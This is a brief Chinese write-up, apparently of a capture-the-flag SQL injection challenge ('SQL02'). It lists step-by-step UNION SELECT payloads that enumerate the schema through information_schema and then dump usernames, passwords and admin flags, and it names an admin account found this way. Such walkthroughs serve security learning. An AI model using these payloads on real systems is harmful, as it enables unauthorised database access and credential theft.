SQL02

一開始用 a 先看有多少資料庫

然後用' order by 1-- // 查詢 column 層數

直到查到第五層

然後用' UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata#查 detabase 的位置

看到了 ApexPredators
用' UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='ApexPredators' #查ApexPredators

看到了 user 了
用' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='ApexPredators' and table_name='users' #查 users

然後用' union select 1,username,password,isAdmin from ApexPredators.users#查帳號內容

找到了有 1 的 admin 帳號
帳號：KubenBlisk
